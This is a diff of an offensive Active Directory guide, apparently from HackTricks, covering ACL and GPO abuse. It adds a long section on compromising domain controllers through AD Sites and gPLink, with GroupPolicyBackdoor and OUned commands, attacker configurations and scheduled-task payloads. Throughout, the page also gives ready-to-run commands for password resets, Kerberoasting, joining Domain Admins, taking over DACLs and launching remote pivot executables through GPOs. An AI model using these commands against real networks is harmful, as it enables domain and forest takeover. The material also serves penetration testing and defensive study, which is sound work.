@@ -20,7 +20,7 @@ This privilege grants an attacker full control over a target user account. Once 
 
 ```bash
 # Reset target user's password over SAMR from Linux
-net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
+net rpc password <samAccountName> '<NewPass>' -U '<domain>/<user>%<pass>' -S <dc_fqdn>
 ```
 
 - **If the account is disabled, clear the UAC flag**: `GenericAll` allows editing `userAccountControl`. From Linux, BloodyAD can remove the `ACCOUNTDISABLE` flag:
@@ -31,7 +31,7 @@ bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccou
 
 - **Targeted Kerberoasting**: Assign an SPN to the user's account to make it kerberoastable, then use Rubeus and targetedKerberoast.py to extract and attempt to crack the ticket-granting ticket (TGT) hashes.
 
-```bash
+```powershell
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
@@ -39,7 +39,7 @@ Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipal
 
 - **Targeted ASREPRoasting**: Disable pre-authentication for the user, making their account vulnerable to ASREPRoasting.
 
-```bash
+```powershell
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
 
@@ -55,7 +55,7 @@ This privilege allows an attacker to manipulate group memberships if they have `
 
 - **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules like Active Directory or PowerSploit.
 
-```bash
+```powershell
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
@@ -84,7 +84,7 @@ If a user has `WriteProperty` rights on all objects for a specific group (e.g., 
 
 - **Add Themselves to the Domain Admins Group**: Achievable via combining `net user` and `Add-NetGroupUser` commands, this method allows privilege escalation within the domain.
 
-```bash
+```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 
@@ -92,7 +92,7 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 
 This privilege enables attackers to add themselves to specific groups, such as `Domain Admins`, through commands that manipulate group membership directly. Using the following command sequence allows for self-addition:
 
-```bash
+```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 
@@ -100,7 +100,7 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 
 A similar privilege, this allows attackers to directly add themselves to groups by modifying group properties if they have the `WriteProperty` right on those groups. The confirmation and execution of this privilege are performed with:
 
-```bash
+```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
 ```
@@ -109,7 +109,7 @@ net group "domain admins" spotless /add /domain
 
 Holding the `ExtendedRight` on a user for `User-Force-Change-Password` allows password resets without knowing the current password. Verification of this right and its exploitation can be done through PowerShell or alternative command-line tools, offering several methods to reset a user's password, including interactive sessions and one-liners for non-interactive environments. The commands range from simple PowerShell invocations to using `rpcclient` on Linux, demonstrating the versatility of attack vectors.
 
-```bash
+```powershell
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
 Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -124,7 +124,7 @@ rpcclient -U KnownUsername 10.10.10.192
 
 If an attacker finds that they have `WriteOwner` rights over a group, they can change the ownership of the group to themselves. This is particularly impactful when the group in question is `Domain Admins`, as changing ownership allows for broader control over group attributes and membership. The process involves identifying the correct object via `Get-ObjectAcl` and then using `Set-DomainObjectOwner` to modify the owner, either by SID or name.
 
-```bash
+```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
@@ -134,7 +134,7 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 
 This permission allows an attacker to modify user properties. Specifically, with `GenericWrite` access, the attacker can change the logon script path of a user to execute a malicious script upon user logon. This is achieved by using the `Set-ADObject` command to update the `scriptpath` property of the target user to point to the attacker's script.
 
-```bash
+```powershell
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
 
@@ -142,7 +142,7 @@ Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\
 
 With this privilege, attackers can manipulate group membership, such as adding themselves or other users to specific groups. This process involves creating a credential object, using it to add or remove users from a group, and verifying the membership changes with PowerShell commands.
 
-```bash
+```powershell
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
 Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
@@ -154,16 +154,16 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 
 ```bash
 # Add yourself to the target group via SAMR
-net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
+net rpc group addmem "<Group Name>" <user> -U '<domain>/<user>%<pass>' -S <dc_fqdn>
 # Verify current members
-net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
+net rpc group members "<Group Name>" -U '<domain>/<user>%<pass>' -S <dc_fqdn>
 ```
 
 ## **WriteDACL + WriteOwner**
 
 Owning an AD object and having `WriteDACL` privileges on it enables an attacker to grant themselves `GenericAll` privileges over the object. This is accomplished through ADSI manipulation, allowing for full control over the object and the ability to modify its group memberships. Despite this, limitations exist when trying to exploit these privileges using the Active Directory module's `Set-Acl` / `Get-Acl` cmdlets.
 
-```bash
+```powershell
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
 $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
@@ -204,13 +204,13 @@ The DCSync attack leverages specific replication permissions on the domain to mi
 
 ### GPO Delegation
 
-Delegated access to manage Group Policy Objects (GPOs) can present significant security risks. For instance, if a user such as `offense\spotless` is delegated GPO management rights, they may have privileges like **WriteProperty**, **WriteDacl**, and **WriteOwner**. These permissions can be abused for malicious purposes, as identified using PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Delegated access to manage Group Policy Objects (GPOs) can present significant security risks. For instance, if a user such as `offense/spotless` is delegated GPO management rights, they may have privileges like **WriteProperty**, **WriteDacl**, and **WriteOwner**. These permissions can be abused for malicious purposes, as identified using PowerView: `Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
 ### Enumerate GPO Permissions
 
-To identify misconfigured GPOs, PowerSploit's cmdlets can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+To identify misconfigured GPOs, PowerSploit's cmdlets can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage: `Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Computers with a Given Policy Applied**: It's possible to resolve which computers a specific GPO applies to, helping understand the scope of potential impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**Computers with a Given Policy Applied**: It's possible to resolve which computers a specific GPO applies to, helping understand the scope of potential impact. `Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
 **Policies Applied to a Given Computer**: To see what policies are applied to a particular computer, commands like `Get-DomainGPO` can be utilized.
 
@@ -222,7 +222,7 @@ You can also use the tool [**GPOHound**](https://github.com/cogiceo/GPOHound) to
 
 Misconfigured GPOs can be exploited to execute code, for example, by creating an immediate scheduled task. This can be done to add a user to the local administrators group on affected machines, significantly elevating privileges:
 
-```bash
+```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
 
@@ -230,7 +230,7 @@ New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net l
 
 The GroupPolicy module, if installed, allows for the creation and linking of new GPOs, and setting preferences such as registry values to execute backdoors on affected computers. This method requires the GPO to be updated and a user to log in to the computer for execution:
 
-```bash
+```powershell
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
@@ -239,7 +239,7 @@ Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "
 
 SharpGPOAbuse offers a method to abuse existing GPOs by adding tasks or modifying settings without the need to create new GPOs. This tool requires modification of existing GPOs or using RSAT tools to create new ones before applying changes:
 
-```bash
+```powershell
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
 
@@ -260,6 +260,191 @@ GPOs also allow for the manipulation of user and group memberships on target sys
 The XML configuration file for Users and Groups outlines how these changes are implemented. By adding entries to this file, specific users can be granted elevated privileges across affected systems. This method offers a direct approach to privilege escalation through GPO manipulation.
 
 Furthermore, additional methods for executing code or maintaining persistence, such as leveraging logon/logoff scripts, modifying registry keys for autoruns, installing software via .msi files, or editing service configurations, can also be considered. These techniques provide various avenues for maintaining access and controlling target systems through the abuse of GPOs.
+
+## Abusing AD Sites and gPLink for DC compromise
+
+Active Directory Sites are LDAP objects under CN=Sites,CN=Configuration,DC=... used to group IP subnets and govern replication/auth. Sites have a gPLink attribute, so GPOs can be linked at the Site scope. Any computer/user in the Site applies linked GPOs, including Domain Controllers present in that Site. Therefore, control of a Site-linked GPO or write access to a Site’s gPLink (via WriteGPLink/GenericWrite/GenericAll) can lead to SYSTEM on DCs and domain compromise.
+
+Notes
+- Intra-site replication ~5 minutes; inter-site replication is 180 minutes by default and controlled by site links/bridges. Time your ops accordingly.
+- The Site container lives in the forest-wide Configuration NC. Writes replicate to all DCs across the forest.
+
+### Enumeration with BloodHound
+- Recent SharpHound/BloodHound updates model Site nodes, their DCs (servers) and subnets, and expose control edges for GenericAll/GenericWrite/WriteGPLink on Site objects.
+- GPO → Site GPLink edges show attack paths where Site control implies DC compromise. Treat Sites as High Value Targets.
+
+### A) You control a GPO already linked to a Site
+Inject a malicious setting in the already linked GPO to target only DC(s) via Computer Name filter. Example: Immediate Scheduled Task that adds a user to local Administrators on the DC.
+
+<details>
+<summary>INI module filter (Immediate Scheduled Task)</summary>
+
+```ini
+[MODULECONFIG]
+name = Scheduled Tasks
+type = computer
+
+[MODULEOPTIONS]
+task_type = immediate
+program = cmd.exe
+arguments = /c "net localgroup Administrators corp.com\\adove /add"
+
+[MODULEFILTERS]
+filters =
+    [
+        {
+            "operator": "AND",
+            "type": "Computer Name",
+            "value": "ad01-dc.corp.com"
+        }
+    ]
+```
+
+</details>
+
+Inject into the Site-linked GPO with GroupPolicyBackdoor (GPB):
+
+```bash
+python3 gpb.py gpo inject -d corp.com --dc ad01-dc.corp.com \
+  -u adove -p 'Password1' -m ImmediateTask_create.ini -n "Paris_Servers_Firewall_Rules"
+```
+After the ~5 minute GPO refresh on the DC, verify local admin:
+
+```bash
+smbclient '\\ad01-dc.corp.com\C$' -U 'corp.com\\adove' --password 'Password1'
+```
+Cleanup state to revert the change:
+
+```bash
+python3 gpb.py gpo clean -d corp.com --dc ad01-dc.corp.com -u adove -p 'Password1' -sf <state_folder>
+```
+
+### B) You can write the Site’s gPLink (WriteGPLink/GenericWrite/GenericAll)
+Two options depending on whether you already control a GPO:
+
+1) Link an attacker-controlled GPO to the Site:
+```bash
+python3 gpb.py links link -d corp.com --dc ad01-dc.corp.com \
+  -o 'CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com' \
+  -n 'CONTROLLED' -u aacre -p 'Password1'
+```
+Then inject your payload in that GPO as in scenario A.
+
+2) GPLink spoofing (fake-domain) when you don’t control any GPO:
+Append to the Site’s gPLink a DN pointing to a GPO in an attacker-controlled, lookalike domain. Victims will retrieve the malicious GPC (LDAP) and GPT (SMB) from you. Example gPLink entry:
+
+```text
+[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=s1n,DC=corp,DC=com;0]
+```
+Automate with OUned.py which temporarily edits the Site’s gPLink, forwards LDAP, serves a fake GPC/GPT and restores the original:
+
+Minimal OUned configuration (target Site NewYork, pick a DC in the same Site to avoid 180 min delay):
+
+<details>
+<summary>Minimal OUned configuration (config.ini)</summary>
+
+```ini
+[GENERAL]
+domain=corp.com
+dc=ad01-dc2.corp.com
+containerDN=CN=NewYork,CN=Sites,CN=Configuration,DC=corp,DC=com
+username=aacre
+password=Password1
+attacker_ip=192.168.123.17
+module=ImmediateTask_create_computer.ini
+target_type=computer
+
+[LDAP]
+ldap_ip=192.168.125.138
+ldap_hostname=WIN-QGNGA6OQUNO
+ldap_username=Administrator
+ldap_password=Password1!
+gpo_id=52BD7653-916B-45D0-B57C-6FEF64742FFD
+ldap_machine_name=S1N$
+ldap_machine_password=<long random password>
+
+[SMB]
+smb_mode=embedded
+share_name=synacktiv
+```
+
+</details>
+
+Module file (execute only on the chosen DC):
+
+```ini
+[MODULECONFIG]
+name = Scheduled Tasks
+type = computer
+
+[MODULEOPTIONS]
+task_type = immediate
+program = cmd.exe
+arguments = /c "net localgroup Administrators corp.com\\aacre /add"
+
+[MODULEFILTERS]
+filters = [{"operator":"AND","type":"Computer Name","value":"ad01-dc2.corp.com"}]
+```
+Run and observe the DC requesting GPT from your host, then cleanly restore gPLink:
+
+```bash
+python3 OUned.py --config config.ini
+```
+Verify local admin on the DC:
+
+```bash
+smbclient '\\ad01-dc2.corp.com\C$' -U 'corp.com\\aacre' --password 'Password1'
+```
+
+### C) Cross-domain lateral movement via Sites (Configuration NC abuse)
+Sites are in the forest-wide, writable Configuration NC replicated to every DC. Principals that can write include: Enterprise Admins, Enterprise Domain Controllers, Domain Admins of the forest-root domain, and NT AUTHORITY\\SYSTEM on any DC. From a compromised non-root domain, execute as SYSTEM on one of its DCs to link a malicious GPO to a Site containing target-domain DCs. After Configuration NC replication and GPO refresh, target DCs apply it (SID filtering does not block this).
+
+Example child → root chain:
+1) Create a GPO in child domain and scope to the child domain SID:
+```bash
+python3 gpb.py gpo create -d dev.corp.com --dc dev01-dc.dev.corp.com \
+  -u devadm -p 'Password1!' -s S-1-5-21-2015307081-2275635861-2347354195 -n LATERAL
+```
+2) Inject payload to add the child DA to local Administrators on the root DC (Computer Name filter):
+```ini
+[MODULECONFIG]
+name = Scheduled Tasks
+type = computer
+
+[MODULEOPTIONS]
+task_type = immediate
+program = cmd.exe
+arguments = /c "net localgroup Administrators dev.corp.com\\devadm /add"
+
+[MODULEFILTERS]
+filters = [{"operator":"AND","type":"Computer Name","value":"ad01-dc.corp.com"}]
+```
+```bash
+python3 gpb.py gpo inject -d dev.corp.com --dc dev01-dc.dev.corp.com \
+  -u devadm -p 'Password1!' -m ImmediateTask_create_computer.ini -n LATERAL
+```
+3) Gain SYSTEM on the child DC and link the GPO to the Site by executing New-GPLink as SYSTEM (e.g., inject an immediate task into Default Domain Controllers Policy):
+```ini
+[MODULECONFIG]
+name = Scheduled Tasks
+type = computer
+
+[MODULEOPTIONS]
+task_type = immediate
+program = powershell.exe
+arguments = New-GPLink -Name LATERAL -Target "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com" -Server dev01-dc.dev.corp.com
+
+[MODULEFILTERS]
+filters = [{"operator":"AND","type":"Computer Name","value":"dev01-dc.dev.corp.com"}]
+```
+```bash
+python3 gpb.py gpo inject -d dev.corp.com --dc dev01-dc.dev.corp.com \
+  -u devadm -p 'Password1!' -m ImmediateTask_create_computer_link.ini -n "Default Domain Controllers Policy"
+```
+4) Wait for: child DC task (≤5 min), intra-site Config NC replication (≤5 min), root DC GPO refresh (≤5 min). Verify access:
+```bash
+smbclient '\\ad01-dc.corp.com\C$' -U 'dev.corp.com\\devadm' --password 'Password1!'
+```
 
 ## SYSVOL/NETLOGON Logon Script Poisoning
 
@@ -295,9 +480,9 @@ Automated tooling may show SYSVOL/NETLOGON as read-only, but underlying NTFS ACL
 
 ```bash
 # Interactive write test
-smbclient \\<dc>\SYSVOL -U <user>%<pass>
-smb: \\> cd <domain>\scripts\
-smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
+smbclient \\\\<dc>\\SYSVOL -U '<user>%<pass>'
+smb: \\> cd <domain>\\scripts\\
+smb: \\<domain>\\scripts\\> put smallfile.txt login.vbs   # check size/time change
 ```
 
 If file size or mtime changes, you have write. Preserve originals before modifying.
@@ -334,12 +519,16 @@ Notes:
 - [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
 - [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 - [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
-- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
+- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
 - [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
 - [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
 - [Samba – net rpc (group membership)](https://www.samba.org/)
 - [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
+- [Synacktiv – Site Unseen: Enumerating and Attacking Active Directory Sites](https://www.synacktiv.com/en/publications/site-unseen-enumerating-and-attacking-active-directory-sites)
+- [GroupPolicyBackdoor (GPB)](https://github.com/synacktiv/GroupPolicyBackdoor)
+- [OUned – gPLink spoofing/OU/site abuse](https://github.com/synacktiv/OUned)
+- [SharpHound PR – Add AD Sites collection](https://github.com/SpecterOps/SharpHound/pull/186)
+- [SharpHoundCommon PR – Site schema support](https://github.com/SpecterOps/SharpHoundCommon/pull/257)
+- [BloodHound PR – Graph support for Sites](https://github.com/SpecterOps/BloodHound/pull/2031)
 
 {{#include ../../../banners/hacktricks-training.md}}
-
-
